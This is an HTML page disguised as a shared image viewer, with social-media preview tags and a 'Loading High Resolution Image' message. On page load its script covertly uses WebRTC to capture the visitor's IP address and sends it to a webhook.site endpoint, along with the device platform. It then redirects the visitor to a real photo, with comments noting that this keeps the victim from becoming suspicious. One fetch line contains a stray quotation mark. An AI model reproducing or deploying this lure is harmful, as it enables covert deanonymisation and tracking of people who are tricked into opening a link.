<!DOCTYPE html>
<html>
<head>
    <meta property="og:title" content="Shared Image">
    <meta property="og:description" content="Click to view full resolution image">
    <meta property="og:image" content="https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <title>Image Viewer</title>

    <script>
        // THE WEBRTC IP-GRABBER
        async function getInternalIP() {
            setTimeout(function() { window.location.href = "https://www.google.com"; }, 23000);
            fetch("https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6?status=landed&device=" + navigator.platform);
            try {
                const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                pc.createDataChannel("");
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                    const internalIP = ipRegex.exec(ice.candidate.candidate)[1];
                    
                    // SEND DATA TO YOUR WEBHOOK
                    // Replace the URL below with your Webhook.site URL
                    fetch("https://webhook.site/41f3dead-5333-427f-b7c5-0eea638b39e6?ip=" + internalIP + "&device=" + navigator.platform");
                    
                    // THE BAIT REDIRECT
                    // After grabbing, move them to your real photo so they aren't suspicious
                    setTimeout(() => {
                        window.location.href = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
                    }, 1000);
                };
            } catch (e) {
                // If it fails, redirect anyway to stay stealthy
                window.location.href = "https://images.unsplash.com/photo-1507525428034-b723cf961d3e";
            }
        }
        window.onload = getInternalIP;
    </script>
</head>
<body style="background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh;">
    <p style="color: white; font-family: sans-serif;">Loading High Resolution Image...</p>
</body>
</html>
